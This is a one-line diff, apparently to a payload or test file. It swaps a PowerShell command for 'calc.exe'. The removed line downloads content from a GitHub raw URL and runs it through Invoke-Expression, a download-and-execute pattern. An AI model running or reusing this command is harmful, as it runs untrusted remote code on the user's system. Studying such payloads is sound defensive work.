@@ -1,1 +1,1 @@
-powershell $script = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Lorcan84/test/main/notepad" -UseBasicParsing; Invoke-Expression $script.Content
+calc.exe
